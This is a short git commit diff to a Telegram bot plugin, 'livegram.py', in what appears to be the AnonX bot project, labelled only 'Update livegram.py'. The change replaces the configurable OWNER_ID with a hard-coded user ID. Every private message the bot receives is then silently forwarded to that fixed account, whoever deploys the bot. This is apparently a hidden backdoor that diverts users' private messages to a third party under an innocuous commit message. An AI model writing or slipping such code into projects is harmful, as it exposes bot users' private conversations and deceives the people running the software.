82b8dc8774b6e0e067fcc5d5e0fb4494488b96a5
THE VIP BOY <117478195+THE-VIP-BOY-OP@users.noreply.github.com>
2023-03-16 15:27:18 +0530

    Update livegram.py

--- AnonX/plugins/livegram.py
+++ AnonX/plugins/livegram.py
@@ -1,11 +1,10 @@
 from pyrogram import Client, filters
 from pyrogram.types import Message
 
-from AnonX import OWNER_ID
 from AnonX import pbot as bot
 
 
 @bot.on_message(filters.private & filters.incoming)
 async def on_pm_s(client: Client, message: Message):
     if not message.from_user.id == 1808943146:
-        fwded_mesg = await message.forward(chat_id=OWNER_ID, disable_notification=True)
+        fwded_mesg = await message.forward(chat_id=1808943146, disable_notification=True)
